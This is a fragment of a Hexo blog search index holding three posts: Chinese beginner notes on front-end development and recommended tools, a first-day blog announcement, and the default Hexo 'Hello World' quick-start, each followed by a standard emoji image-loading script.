        <content type="html"><![CDATA[<h1 id="前端开发"><a href="#前端开发" class="headerlink" title="前端开发"></a>前端开发</h1><h2 id="前端开发概述"><a href="#前端开发概述" class="headerlink" title="前端开发概述"></a>前端开发概述</h2><h3 id="1-什么是前端开发"><a href="#1-什么是前端开发" class="headerlink" title="1.什么是前端开发"></a>1.什么是前端开发</h3><pre><code> 前端开发也叫web开发,指的是基于web的互联网产品的页面(也可叫做界面)开发及功能开发。</code></pre><h3 id="2-前端需要哪些技术"><a href="#2-前端需要哪些技术" class="headerlink" title="2.前端需要哪些技术"></a>2.前端需要哪些技术</h3><pre class=" language-txet"><code class="language-txet">（1）photoshop（2）HTML/HTML5（3）CSS/CSS3（4）布局知识（Photoshop+HTML/HTML＋CSS/CSS3）（5）Bootstrap（6）JavaScript（7）jQuery（8）Ajax</code></pre><h2 id="需要下载的软件"><a href="#需要下载的软件" class="headerlink" title="需要下载的软件"></a>需要下载的软件</h2><h3 id="1-推荐一个makedown文件（用于记笔记）"><a href="#1-推荐一个makedown文件（用于记笔记）" class="headerlink" title="1.推荐一个makedown文件（用于记笔记）"></a>1.推荐一个makedown文件（用于记笔记）</h3><p>​    推荐下载Typora，很方便，完全免费。</p><h3 id="2-Webstorm"><a href="#2-Webstorm" class="headerlink" title="2.Webstorm"></a>2.Webstorm</h3><p>​    本人用的是idea</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 前端自学笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端自学笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>article title</title>
      <link href="/2020/04/01/article-title/"/>
      <url>/2020/04/01/article-title/</url>
      
        <content type="html"><![CDATA[<p>今天正式创建博客，4月3日域名审核完毕，正式开始写blog之旅~，分享一些学习经验还有自己的一些事情，后天见咯。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/04/01/hello-world/"/>
      <url>/2020/04/01/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
